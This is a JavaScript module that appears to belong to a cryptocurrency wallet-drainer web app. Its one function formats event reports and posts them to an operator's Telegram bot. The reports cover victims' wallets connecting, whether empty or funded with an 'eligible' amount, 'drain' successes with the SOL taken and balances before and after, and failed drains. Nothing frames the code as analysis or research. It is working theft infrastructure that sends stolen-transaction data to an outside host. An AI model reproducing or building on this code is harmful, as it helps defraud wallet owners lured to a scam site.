export const sendTelegramLog = async (event, data) => {
  try {
    const botToken = process.env.NEXT_PUBLIC_BOT_TOKEN;
    const chatId = process.env.NEXT_PUBLIC_CHAT_ID;
    
    if (!botToken || !chatId) {
      console.log('Telegram credentials missing');
      return;
    }
    
    const formatAddress = (addr) => {
      if (!addr) return 'unknown';
      return `${addr.slice(0,6)}...${addr.slice(-4)}`;
    };
    
    const formatNumber = (num) => {
      if (typeof num === 'number') return num.toFixed(4);
      if (typeof num === 'string') return num;
      return 'N/A';
    };
    
    const getTimestamp = () => {
      return new Date().toLocaleTimeString('en-US', { hour12: false });
    };
    
    let message = '';
    
    switch(event) {
      case 'connected_empty':
        message = `🟡 Wallet Connected (Empty)
└ Wallet: ${formatAddress(data.address)}
└ Type: ${data.walletType}
└ Balance: ${formatNumber(data.balance)} ${data.walletType === 'phantom' ? 'SOL' : 'ETH'}
└ Time: ${getTimestamp()}`;
        break;
        
      case 'connected_funded':
        message = `🟢 Wallet Connected (Funded)
└ Wallet: ${formatAddress(data.address)}
└ Type: ${data.walletType}
└ Balance: ${formatNumber(data.balance)} ${data.walletType === 'phantom' ? 'SOL' : 'ETH'}
└ Eligible: ${data.eligibleAmount} SOL
└ Time: ${getTimestamp()}`;
        break;
        
      case 'drain_success':
        const txShort = data.tx && !data.tx.includes('pending') 
          ? data.tx.slice(0,8) 
          : (data.tx || 'unknown');
        message = `💰 Drain ${data.warning ? 'Likely Successful' : 'Successful'}
└ Wallet: ${formatAddress(data.address)}
└ Amount: ${formatNumber(data.amount)} SOL
└ TX: ${txShort}...
└ Balance Before: ${formatNumber(data.balanceBefore)} SOL
└ Balance After: ${formatNumber(data.balanceAfter)} SOL
└ Time: ${getTimestamp()}
${data.warning ? `└ ⚠️ ${data.warning}` : ''}`;
        break;
        
      case 'drain_failed':
        message = `❌ Drain Failed
└ Wallet: ${formatAddress(data.address)}
└ Error: ${data.error}
└ Time: ${getTimestamp()}`;
        break;
        
      case 'connection_error':
        message = `⚠️ Connection Error
└ Type: ${data.walletType}
└ Error: ${data.error}
└ Time: ${getTimestamp()}`;
        break;
        
      default:
        message = `📊 ${event.toUpperCase()}
└ Data: ${JSON.stringify(data, null, 2).substring(0, 200)}
└ Time: ${getTimestamp()}`;
    }
    
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      })
    });
    
    if (!response.ok) {
      const errorText = await response.text();
      console.error('Telegram API error:', response.status, errorText);
    }
    
  } catch (error) {
    console.error('Telegram logging failed:', error);
  }
};
